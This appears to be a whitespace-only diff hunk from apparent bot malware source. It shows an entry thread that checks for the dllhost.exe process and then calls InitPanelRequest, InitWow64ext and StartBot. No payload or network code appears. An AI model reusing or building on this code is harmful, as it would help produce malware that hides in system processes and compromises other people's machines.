@@ -43,8 +43,8 @@ static DWORD WINAPI EntryThread(LPVOID lpParam)
    if(Funcs::pLstrcmpiA(exeName, Strs::dllhostExe) == 0)          // if exeName == dllhost.exe
    {
 #if !_WIN64
-      InitPanelRequest();									      
-      InitWow64ext();											  // sets current process' heap handle to g_heap
+      InitPanelRequest();                                         
+      InitWow64ext();                                             // sets current process' heap handle to g_heap
       StartBot();
 #endif
    }
